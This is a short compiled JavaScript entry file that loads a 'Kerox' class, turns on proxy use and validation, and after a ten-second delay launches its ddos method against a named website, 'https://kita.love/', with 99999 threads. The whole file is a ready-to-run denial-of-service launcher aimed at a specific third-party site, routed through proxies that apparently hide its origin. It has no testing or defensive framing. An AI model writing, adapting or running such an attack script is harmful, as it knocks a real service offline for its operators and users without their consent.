"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const Kerox_1 = require("./partials/classes/Kerox");
const kerox = new Kerox_1.Kerox({
    refreshRate: 5,
    useProxies: true,
    validateProxies: true,
    updatesPerSecond: 1,
});
setTimeout(() => {
    kerox.ddos({
        target: 'https://kita.love/',
        duration: 15,
        threads: 99999,
        CPUs: 2,
        // agent: {
        //    keepAlive: true,
        //    scheduling: 'fifo',
        // }
    });
}, 10000);
//# sourceMappingURL=index.js.map